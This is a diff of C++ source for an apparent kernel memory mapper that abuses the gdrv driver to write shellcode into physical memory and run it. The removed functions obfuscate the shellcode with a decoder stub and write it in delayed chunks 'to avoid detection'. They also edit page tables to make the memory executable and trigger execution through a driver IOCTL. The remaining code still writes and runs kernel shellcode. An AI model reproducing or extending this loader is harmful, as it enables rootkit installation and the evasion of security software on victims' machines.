@@ -490,145 +490,6 @@ uint64_t GDRVMapper::FindKThreadStackMemory() {
     return 0;
 }
 
-void GDRVMapper::CacheWritableRegion(uint64_t address, size_t size, const std::string& source) {
-    MemoryRegion region = {
-        .address = address,
-        .size = size,
-        .isExecutable = false,  // Will be set when made executable
-        .isWritable = true,
-        .source = source
-    };
-    writableRegions.push_back(region);
-}
-
-bool GDRVMapper::ValidateMemoryWrite(uint64_t address, const void* buffer, size_t size) {
-    // Allocate a buffer for verification
-    std::vector<uint8_t> readBack(size);
-    
-    // Read back the written data
-    if (!ReadPhysicalMemory(address, readBack.data(), size)) {
-        return false;
-    }
-    
-    // Compare with original data
-    return memcmp(buffer, readBack.data(), size) == 0;
-}
-
-bool GDRVMapper::WriteShellcodeIncrementally(uint64_t baseAddress, const std::vector<uint8_t>& shellcode, bool obfuscate) {
-    std::cout << "[*] Writing shellcode incrementally..." << std::endl;
-    
-    // Optionally obfuscate the shellcode
-    ObfuscatedShellcode obfuscatedCode;
-    const std::vector<uint8_t>* codeToWrite = &shellcode;
-    
-    if (obfuscate) {
-        obfuscatedCode = ShellcodeUtils::ObfuscateShellcode(shellcode);
-        codeToWrite = &obfuscatedCode.code;
-    }
-    
-    // Write decoder stub first if obfuscated
-    if (obfuscate) {
-        std::cout << "[*] Writing decoder stub..." << std::endl;
-        auto decoderStub = ShellcodeUtils::CreateDecoderStub(
-            obfuscatedCode.key, 
-            baseAddress + obfuscatedCode.decoder.size(),  // Point to encoded shellcode
-            obfuscatedCode.code.size()
-        );
-        
-        if (!WritePhysicalMemory(baseAddress, decoderStub.data(), decoderStub.size(), true)) {
-            std::cerr << "[-] Failed to write decoder stub" << std::endl;
-            return false;
-        }
-        
-        // Verify decoder stub
-        if (!ValidateMemoryWrite(baseAddress, decoderStub.data(), decoderStub.size())) {
-            std::cerr << "[-] Decoder stub verification failed" << std::endl;
-            return false;
-        }
-    }
-    
-    // Calculate start address for shellcode
-    uint64_t shellcodeAddr = baseAddress + (obfuscate ? obfuscatedCode.decoder.size() : 0);
-    
-    // Break shellcode into chunks and write incrementally
-    auto chunks = ShellcodeUtils::ChunkShellcode(*codeToWrite, ShellcodeUtils::DEFAULT_CHUNK_SIZE);
-    
-    for (size_t i = 0; i < chunks.size(); i++) {
-        const auto& chunk = chunks[i];
-        uint64_t chunkAddr = shellcodeAddr + (i * ShellcodeUtils::DEFAULT_CHUNK_SIZE);
-        
-        std::cout << "[*] Writing chunk " << i + 1 << "/" << chunks.size() 
-                 << " at 0x" << std::hex << chunkAddr << std::dec << std::endl;
-        
-        // Write chunk with non-strict validation
-        if (!WritePhysicalMemory(chunkAddr, chunk.data(), chunk.size(), false)) {
-            std::cerr << "[-] Failed to write chunk " << i + 1 << std::endl;
-            return false;
-        }
-        
-        // Small delay between writes to avoid detection
-        std::this_thread::sleep_for(std::chrono::microseconds(WRITE_DELAY_US));
-    }
-    
-    std::cout << "[+] Shellcode written successfully" << std::endl;
-    return true;
-}
-
-bool GDRVMapper::ExecuteObfuscatedShellcode(uint64_t baseAddress, const ObfuscatedShellcode& shellcode, uint64_t* result) {
-    std::cout << "[*] Executing obfuscated shellcode..." << std::endl;
-    
-    // Write decoder and encoded shellcode
-    if (!WriteShellcodeIncrementally(baseAddress, shellcode.code, true)) {
-        return false;
-    }
-    
-    // Make memory executable
-    if (!PageTableUtils::MakeMemoryExecutable(
-        baseAddress,
-        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
-        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
-        nullptr  // Pass null to avoid recursion
-    )) {
-        std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
-        return false;
-    }
-    
-    // Create execution shellcode
-    auto execShellcode = ShellcodeUtils::CreateExecShellcode(baseAddress);
-    
-    // Write and execute
-    uint64_t execAddr = baseAddress + 0x1000;  // Use next page
-    
-    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
-        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
-        return false;
-    }
-    
-    // Execute
-    GDRV_MEMORY_WRITE execRequest = { 0 };
-    execRequest.Address = execAddr;
-    execRequest.Length = sizeof(uint64_t);
-    execRequest.Buffer = (UINT64)result;
-    
-    DWORD bytesReturned = 0;
-    if (!DeviceIoControl(
-        hDevice,
-        GDRV_IOCTL_WRITE_MEMORY,
-        &execRequest,
-        sizeof(execRequest),
-        result,
-        sizeof(uint64_t),
-        &bytesReturned,
-        NULL
-    )) {
-        std::cerr << "[-] Failed to execute shellcode" << std::endl;
-        return false;
-    }
-    
-    std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
-    return true;
-}
-
 bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result) {
     std::cout << "[*] Attempting to execute shellcode..." << std::endl;
     
@@ -640,11 +501,8 @@ bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint
         return false;
     }
 
-    // Convert shellcode to vector and write incrementally
-    std::vector<uint8_t> shellcodeVec(static_cast<const uint8_t*>(shellcode),
-                                     static_cast<const uint8_t*>(shellcode) + size);
-    
-    if (!WriteShellcodeIncrementally(shellcodeAddr, shellcodeVec, true)) {
+    // Write the shellcode
+    if (!WritePhysicalMemory(shellcodeAddr, shellcode, size)) {
         std::cerr << "[-] Failed to write shellcode" << std::endl;
         return false;
     }
